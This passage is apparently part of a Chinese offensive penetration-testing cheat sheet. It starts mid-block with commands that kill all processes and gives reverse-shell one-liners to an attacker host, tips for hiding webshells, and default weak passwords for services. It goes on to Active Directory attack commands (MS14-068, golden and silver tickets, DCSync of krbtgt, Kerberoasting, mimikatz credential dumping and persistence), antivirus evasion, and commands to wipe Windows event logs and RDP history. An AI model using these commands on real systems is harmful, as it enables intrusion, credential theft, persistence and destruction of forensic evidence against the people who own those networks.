kill -9 -1
killall apache2
```

#### JSP

Tomcat无文件Shell： [https://github.com/z1Ro0/tomcat\_nofile\_webshell](https://github.com/z1Ro0/tomcat_nofile_webshell)

冰蝎去特征（请参考酒仙桥六号部队的文章）

[冰蝎，从入门到魔改](https://mp.weixin.qq.com/s/s_DcLdhEtIZkC2_z0Zz4FQ)

[冰蝎改造之不改动客户端=&gt;内存马](https://mp.weixin.qq.com/s?__biz=MzU2NTc2MjAyNg==&mid=2247484318&idx=1&sn=ece9e52218be0ea84ef166c3bfd20f23&chksm=fcb7811bcbc0080dd2c39f228dcfe069880218b9f354b1283606af680b1eaecdc07a8a43b188&scene=126&sessionid=1596615082&key=4024143df9a90d6cf039e6e552bb5cc12f755fd25a44855e8dfaff85efc30720e50fd9f3299dbb007c78e96c833dc3df98a87f4c4a4e3ccff0084c0ad0325d06a0265851bfa777df7f014bc8d790632f&ascene=1&uin=MTUwNjgwNTkxMA%3D%3D&devicetype=Windows+10+x64&version=62090070&lang=zh_CN&exportkey=AzFdHdxTih44P2kITVRk35s%3D&pass_ticket=lppPNqJhx8ZD573ypwsqgQ41%2F%2BJd%2B2avwvIfBnLfOjeNcQkihuzk3CgS%2F36Je%2Bnb)

#### 隐藏WebShell

> 1、仿照已存在的文件起名字，隐藏在深层目录， 创建…目录隐藏shell（ls -al你就知道为啥了）
>
> 2、利用静态文件，比如图片马然后利用 .htaccess 进行解析
>
> 3、修改WebShell时间戳为同目录下其它文件相同的时间

#### 反弹Shell

```text
#Bash
bash -i >& /dev/tcp/attackerip/6666 0>&1

#nc
nc -e /bin/sh attackerip 6666

#python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.1.1.15",6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

#DNS_Shell
https://github.com/ahhh/Reverse_DNS_Shell

#icmp_shell
http://icmpshell.sourceforge.net/

#Linux(index.js)
https://github.com/lukechilds/reverse-shell
```

**PHP**： [https://github.com/pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)

**JSP**： [https://github.com/z3v2cicidi/jsp-reverse-shell](https://github.com/z3v2cicidi/jsp-reverse-shell)

**ASPX**： [https://github.com/borjmz/aspx-reverse-shell](https://github.com/borjmz/aspx-reverse-shell)

> **攻击机 VPS 监听接 shell**

```text
nc -lvp 666
```

## 横向渗透

#### 

### 端口渗透

**端口扫描**

* 1.端口的指纹信息（版本信息）
* 2.端口所对应运行的服务
* 3.常见的默认端口号
* 4.尝试弱口令

**端口爆破**

[hydra](https://github.com/vanhauser-thc/thc-hydra)

**端口弱口令**

* NTScan
* Hscan
* 自写脚本

**端口溢出**

**smb**

* ms08067
* ms17010
* ms11058
* ...

**apache** **ftp** **...**

**常见的默认端口**

**1、web类\(web漏洞/敏感目录\)**

第三方通用组件漏洞: struts thinkphp jboss ganglia zabbix ...

```text
80 web 
80-89 web 
8000-9090 web 
```

**2、数据库类\(扫描弱口令\)**

```text
1433 MSSQL 
1521 Oracle 
3306 MySQL 
5432 PostgreSQL 
50000 DB2
```

**3、特殊服务类\(未授权/命令执行类/漏洞\)**

```text
443 SSL心脏滴血 
445 ms08067/ms11058/ms17010等 
873 Rsync未授权 
5984 CouchDB http://xxx:5984/_utils/ 
6379 redis未授权 
7001,7002 WebLogic默认弱口令，反序列 
9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 
11211 memcache未授权访问 
27017,27018 Mongodb未授权访问 
50000 SAP命令执行 
50070,50030 hadoop默认端口未授权访问 
```

**4、常用端口类\(扫描弱口令/端口爆破\)**

```text
21 ftp 
22 SSH 
23 Telnet 
445 SMB弱口令扫描 
2601,2604 zebra路由，默认密码zebra 
3389 远程桌面 
```

**5、端口合计所对应的服务**

```text
21 ftp 
22 SSH 
23 Telnet 
25 SMTP 
53 DNS 
69 TFTP 
80 web 
80-89 web 
110 POP3 
135 RPC 
139 NETBIOS 
143 IMAP 
161 SNMP 
389 LDAP 
443 SSL心脏滴血以及一些web漏洞测试 
445 SMB 
512,513,514 Rexec 
873 Rsync未授权 
1025,111 NFS 
1080 socks 
1158 ORACLE EMCTL2601,2604 zebra路由，默认密码zebra案 
1433 MSSQL (暴力破解) 
1521 Oracle:(iSqlPlus Port:5560,7778) 
2082/2083 cpanel主机管理系统登陆 （国外用较多） 
2222 DA虚拟主机管理系统登陆 （国外用较多） 
2601,2604 zebra路由，默认密码zebra 
3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了 
3306 MySQL （暴力破解） 
3312/3311 kangle主机管理系统登陆 
3389 远程桌面 
3690 svn 
4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网 
4848 GlassFish web中间件 弱口令:admin/adminadmin 
5432 PostgreSQL 
5900 vnc 
5984 CouchDB http://xxx:5984/_utils/ 
6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网 
6379 redis未授权 
7001,7002 WebLogic默认弱口令，反序列 
7778 Kloxo主机控制面板登录 
8000-9090 都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上 
8080 tomcat/WDCd/ 主机管理系统，默认弱口令 
8080,8089,9090 JBOSS 
8081 Symantec AV/Filter for MSE 
8083 Vestacp主机管理系统 （国外用较多） 
8649 ganglia 
8888 amh/LuManager 主机管理系统默认端口 
9000 fcgi fcig php执行 
9043 websphere[web中间件] 弱口令: admin/admin websphere/ websphere ststem/manager 
9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 
10000 Virtualmin/Webmin 服务器虚拟主机管理系统 
11211 memcache未授权访问 
27017,27018 Mongodb未授权访问 
28017 mongodb统计页面 
50000 SAP命令执行 
50060 hadoop 
50070,50030 hadoop默认端口未授权访问
```

#### 

### 域渗透

**信息搜集**

**powerview.ps1**

```text
Get-NetDomain - gets the name of the current user's domain
Get-NetForest - gets the forest associated with the current user's domain
Get-NetForestDomains - gets all domains for the current forest
Get-NetDomainControllers - gets the domain controllers for the current computer's domain
Get-NetCurrentUser - gets the current [domain\]username
Get-NetUser - returns all user objects, or the user specified (wildcard specifiable)
Get-NetUserSPNs - gets all user ServicePrincipalNames
Get-NetOUs - gets data for domain organization units
Get-NetGUIDOUs - finds domain OUs linked to a specific GUID
Invoke-NetUserAdd - adds a local or domain user
Get-NetGroups - gets a list of all current groups in the domain
Get-NetGroup - gets data for each user in a specified domain group
Get-NetLocalGroups - gets a list of localgroups on a remote host or hosts
Get-NetLocalGroup - gets the members of a localgroup on a remote host or hosts
Get-NetLocalServices - gets a list of running services/paths on a remote host or hosts
Invoke-NetGroupUserAdd - adds a user to a specified local or domain group
Get-NetComputers - gets a list of all current servers in the domain
Get-NetFileServers - get a list of file servers used by current domain users
Get-NetShare - gets share information for a specified server
Get-NetLoggedon - gets users actively logged onto a specified server
Get-NetSessions - gets active sessions on a specified server
Get-NetFileSessions - returned combined Get-NetSessions and Get-NetFiles
Get-NetConnections - gets active connections to a specific server resource (share)
Get-NetFiles - gets open files on a server
Get-NetProcesses - gets the remote processes and owners on a remote server
```

**BloodHound**

**获取某OU下所有机器信息**

```yaml
{
            "name": "Find the specificed OU computers",
            "queryList": [
                {
                    "final": false,
                    "title": "Select a OU...",
                    "query": "MATCH (n:OU) RETURN distinct n.name ORDER BY n.name DESC"
                },
                {
                    "final": true,
                    "query": "MATCH (m:OU  {name: $result}) with m MATCH p=(o:OU {objectid: m.objectid})-[r:Contains*1..]->(n:Computer) RETURN p",
                    "allowCollapse": true,
                    "endNode": "{}"
                }
            ]
        }
```

**自动标记owned用户及机器**

[SyncDog](https://github.com/Lz1y/SyncDog)

**获取域内DNS信息**

* [adidnsdump](https://github.com/dirkjanm/adidnsdump)
* [域渗透——DNS记录的获取](https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DNS%E8%AE%B0%E5%BD%95%E7%9A%84%E8%8E%B7%E5%8F%96/) ​

**获取域控的方法**

**SYSVOL**

SYSVOL是指存储域公共文件服务器副本的共享文件夹，它们在域中所有的域控制器之间复制。 Sysvol文件夹是安装AD时创建的，它用来存放GPO、Script等信息。同时，存放在Sysvol文件夹中的信息，会复制到域中所有DC上。 相关阅读:

* [寻找SYSVOL里的密码和攻击GPP（组策略偏好）](http://www.freebuf.com/vuls/92016.html)
* [Windows Server 2008 R2之四管理Sysvol文件夹](http://blog.51cto.com/ycrsjxy/203095)
* [SYSVOL中查找密码并利用组策略首选项](https://adsecurity.org/?p=2288)
* [利用SYSVOL还原组策略中保存的密码](https://xz.aliyun.com/t/1653)

**MS14-068 Kerberos**

```text
python ms14-068.py -u 域用户@域名 -p 密码 -s 用户SID -d 域主机
```

利用mimikatz将工具得到的[TGT\_domainuser@SERVER.COM.ccache](mailto:TGT_domainuser@SERVER.COM.ccache)写入内存，创建缓存证书：

```text
mimikatz.exe "kerberos::ptc c:TGT_darthsidious@pentest.com.ccache" exit
net use k: \pentest.comc$
```

相关阅读 :

* [Kerberos的工具包PyKEK](http://adsecurity.org/?p=676)
* [深入解读MS14-068漏洞](http://www.freebuf.com/vuls/56081.html)
* [Kerberos的安全漏洞](https://adsecurity.org/?p=541)

**SPN扫描**

Kerberoast可以作为一个有效的方法从Active Directory中以普通用户的身份提取服务帐户凭据，无需向目标系统发送任何数据包。 SPN是服务在使用Kerberos身份验证的网络上的唯一标识符。它由服务类，主机名和端口组成。在使用Kerberos身份验证的网络中，必须在内置计算机帐户（如NetworkService或LocalSystem）或用户帐户下为服务器注册SPN。对于内部帐户，SPN将自动进行注册。但是，如果在域用户帐户下运行服务，则必须为要使用的帐户的手动注册SPN。 SPN扫描的主要好处是，SPN扫描不需要连接到网络上的每个IP来检查服务端口，SPN通过LDAP查询向域控执行服务发现，SPN查询是Kerberos的票据行为一部分，因此比较难检测SPN扫描。 相关阅读 :

* [非扫描式的SQL Server发现](https://blog.netspi.com/locate-and-attack-domain-sql-servers-without-scanning/)
* [SPN扫描](https://adsecurity.org/?p=1508)
* [扫描SQLServer的脚本](https://github.com/PyroTek3/PowerShell-AD-Recon)

**Kerberos的黄金门票**

在域上抓取的哈希

```text
lsadump::dcsync /domain:pentest.com /user:krbtgt
```

```text
kerberos::purge
kerberos::golden /admin:administrator /domain:域 /sid:SID /krbtgt:hash值 /ticket:adinistrator.kiribi
kerberos::ptt administrator.kiribi
kerberos::tgt
net use k: \pnet use k: \pentest.comc$
```

相关阅读 :

* [https://adsecurity.org/?p=1640](https://adsecurity.org/?p=1640)
* [域服务账号破解实践](http://bobao.360.cn/learning/detail/3564.html)
* [Kerberos的认证原理](https://blog.csdn.net/wulantian/article/details/42418231)
* [深刻理解windows安全认证机制ntlm＆Kerberos](https://klionsec.github.io/2016/08/10/ntlm-kerberos/)

**Kerberos的银票务**

黄金票据和白银票据的一些区别： Golden Ticket：伪造`TGT`，可以获取`任何Kerberos`服务权限 银票：伪造TGS，`只能访问指定的服务` 加密方式不同： Golden Ticket由`krbtgt`的hash加密 Silver Ticket由`服务账号`（通常为计算机账户）Hash加密 认证流程不同： 金票在使用的过程需要同域控通信 银票在使用的过程不需要同域控通信 相关阅读 :

* [攻击者如何使用Kerberos的银票来利用系统](https://adsecurity.org/?p=2011)
* [域渗透——Pass The Ticket](https://www.feiworks.com/wy/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Pass%20The%20Ticket.pdf)

**域服务账号破解**

与上面SPN扫描类似的原理 [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast) 获取所有用作SPN的帐户

```text
setspn -T PENTEST.com -Q */*
```

从Mimikatz的RAM中提取获得的门票

```text
kerberos::list /export
```

用rgsrepcrack破解

```text
tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```

**凭证盗窃**

从搜集的密码里面找管理员的密码

**NTLM relay**

* [One API call away from Domain Admin](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/)
* [privexchange](https://github.com/dirkjanm/privexchange/)
* [Exchange2domain](https://github.com/ridter/exchange2domain)

**Kerberos委派**

* [Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [s4u2pwnage](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)
* [Attacking Kerberos Delegation](https://xz.aliyun.com/t/2931)
* [用打印服务获取域控](https://adsecurity.org/?p=4056)
* [Computer Takeover](https://www.harmj0y.net/blog/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/)
* [Combining NTLM Relaying and Kerberos delegation](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/)
* [CVE-2019-1040](https://dirkjanm.io/exploiting-CVE-2019-1040-relay-vulnerabilities-for-rce-and-domain-admin/)

**地址解析协议**

实在搞不定再搞ARP ​

**获取AD哈希**

* 使用VSS卷影副本
* Ntdsutil中获取NTDS.DIT​​文件
* PowerShell中提取NTDS.DIT --&gt;[Invoke-NinaCopy](https://github.com/clymb3r/PowerShell/tree/master/Invoke-NinjaCopy)
* 使用Mimikatz提取

```text
mimikatz lsadump::lsa /inject exit 
```

* 使用PowerShell Mimikatz
* 使用Mimikatz的DCSync 远程转储Active Directory凭证 提取 KRBTGT用户帐户的密码数据：

```text
Mimikatz "privilege::debug" "lsadump::dcsync /domain:rd.adsecurity.org /user：krbtgt"exit
```

管理员用户帐户提取密码数据：

```text
Mimikatz "privilege::debug" "lsadump::dcsync /domain:rd.adsecurity.org /user：Administrator" exit

```

* NTDS.dit中提取哈希 使用esedbexport恢复以后使用ntdsxtract提取

**AD持久化**

**活动目录持久性技巧**

[https://adsecurity.org/?p=1929](https://adsecurity.org/?p=1929) DS恢复模式密码维护 DSRM密码同步

> Windows Server 2008 需要安装KB961320补丁才支持DSRM密码同步，Windows Server 2003不支持DSRM密码同步。KB961320:[https://support.microsoft.com/en-us/help/961320/a-feature-is-available-for-windows-server-2008-that-lets-you-synchroni,可参考：\[巧用DSRM密码同步将域控权限持久化\]\(http://drops.xmd5.com/static/drops/tips-9297.html\)](https://support.microsoft.com/en-us/help/961320/a-feature-is-available-for-windows-server-2008-that-lets-you-synchroni,%E5%8F%AF%E5%8F%82%E8%80%83%EF%BC%9A%5B%E5%B7%A7%E7%94%A8DSRM%E5%AF%86%E7%A0%81%E5%90%8C%E6%AD%A5%E5%B0%86%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96%5D%28http://drops.xmd5.com/static/drops/tips-9297.html%29)

[DCshadow](https://www.dcshadow.com/)

**Security Support Provider**

简单的理解为SSP就是一个DLL，用来实现身份认证

```text
privilege::debug
misc::memssp
```

这样就不需要重启`c:/windows/system32`可看到新生成的文件kiwissp.log

**SID History**

SID历史记录允许另一个帐户的访问被有效地克隆到另一个帐户

```text
mimikatz "privilege::debug" "misc::addsid bobafett ADSAdministrator"
```

**AdminSDHolder＆SDProp**

利用AdminSDHolder＆SDProp（重新）获取域管理权限

**组策略**

[https://adsecurity.org/?p=2716](https://adsecurity.org/?p=2716) [策略对象在持久化及横向渗透中的应用](https://www.anquanke.com/post/id/86531)

**Hook PasswordChangeNotify**

[http://www.vuln.cn/6812](http://www.vuln.cn/6812)

**Kerberoasting后门**

[域渗透-Kerberoasting](https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting/)

**AdminSDHolder**

[Backdooring AdminSDHolder for Persistence](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)

**Delegation**

[Unconstrained Domain Persistence](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#unconstrained-domain-persistence)

**其他**

**域内主机提权**

[SharpAddDomainMachine](https://github.com/Ridter/SharpAddDomainMachine)

**Exchange的利用**

* [**Exchange2domain**](https://github.com/Ridter/Exchange2domain)
* [**CVE-2018-8581**](https://github.com/WyAtu/CVE-2018-8581/)
* [**CVE-2019-1040**](https://github.com/Ridter/CVE-2019-1040)
* [**CVE-2020-0688**](https://github.com/Ridter/CVE-2020-0688)
* [**NtlmRelayToEWS**](https://github.com/Arno0x/NtlmRelayToEWS)
* [**ewsManage**](https://github.com/3gstudent/ewsManage)

**TIPS**

[《域渗透——Dump Clear-Text Password after KB2871997 installed》](https://github.com/3gstudent/Dump-Clear-Password-after-KB2871997-installed)

[《域渗透——Hook PasswordChangeNotify》](http://www.vuln.cn/6812)

> 可通过Hook PasswordChangeNotify实时记录域控管理员的新密码

[《域渗透——Local Administrator Password Solution》](http://www.liuhaihua.cn/archives/179102.html)

> 域渗透时要记得留意域内主机的本地管理员账号

[《域渗透——利用SYSVOL还原组策略中保存的密码》](https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8SYSVOL%E8%BF%98%E5%8E%9F%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/)

**相关工具**

* [BloodHound](https://github.com/BloodHoundAD/BloodHound)
* [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
* [DeathStar](https://github.com/byt3bl33d3r/DeathStar)

  > 利用过程：[http://www.freebuf.com/sectool/160884.html](http://www.freebuf.com/sectool/160884.html)

### 在远程系统上执行程序

* At
* Psexec
* WMIC
* Wmiexec
* Smbexec
* Powershell remoting
* DCOM
* Winrm \([https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)\)

### IOT相关

* 1、路由器 [routersploit](https://github.com/reverse-shell/routersploit)
* 2、打印机 [PRET](https://github.com/RUB-NDS/PRET)
* 3、IOT exp [https://www.exploitee.rs/](https://www.exploitee.rs/)
* 4、相关 [OWASP-Nettacker](https://www.owasp.org/index.php/OWASP_Nettacker) [isf](https://github.com/dark-lbp/isf) [icsmaster](https://github.com/w3h/icsmaster)

### 中间人

* [Cain](http://www.oxid.it/cain.html)
* [Ettercap](https://github.com/Ettercap/ettercap)
* [Responder](https://github.com/SpiderLabs/Responder)
* [MITMf](https://github.com/byt3bl33d3r/MITMf)
* [3r/MITMf\)](https://github.com/evilsocket/bettercap)

### 规避杀软及检测

**Bypass Applocker**

[UltimateAppLockerByPassList](https://github.com/api0cradle/UltimateAppLockerByPassList) [https://lolbas-project.github.io/](https://lolbas-project.github.io/)

**bypassAV**

* Empire
* PEspin
* Shellter
* Ebowla
* Veil
* PowerShell
* Python
* [代码注入技术Process Doppelgänging](http://www.4hou.com/technology/9379.html)
* ...

## 痕迹清理

### [Windows日志清除](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4%E4%B8%8E%E7%BB%95%E8%BF%87/)

获取日志分类列表：

```text
wevtutil el >1.txt
```

获取单个日志类别的统计信息： eg.

```text
wevtutil gli "windows powershell"
```

回显：

```text
creationTime: 2016-11-28T06:01:37.986Z
lastAccessTime: 2016-11-28T06:01:37.986Z
lastWriteTime: 2017-08-08T08:01:20.979Z
fileSize: 1118208
attributes: 32
numberOfLogRecords: 1228
oldestRecordNumber: 1
```

查看指定日志的具体内容：

```text
wevtutil qe /f:text "windows powershell"
```

删除单个日志类别的所有信息：

```text
wevtutil cl "windows powershell"
```

### 破坏Windows日志记录功能

利用工具

* [Invoke-Phant0m](https://github.com/hlldz/Invoke-Phant0m)
* [Windwos-EventLog-Bypass](https://github.com/3gstudent/Windwos-EventLog-Bypass)

### msf

```text
run clearlogs 
```

```text
clearev 
```

### 3389登陆记录清除

```bash
@echo off
@reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va /f
@del "%USERPROFILE%\My Documents\Default.rdp" /a
@exit
```

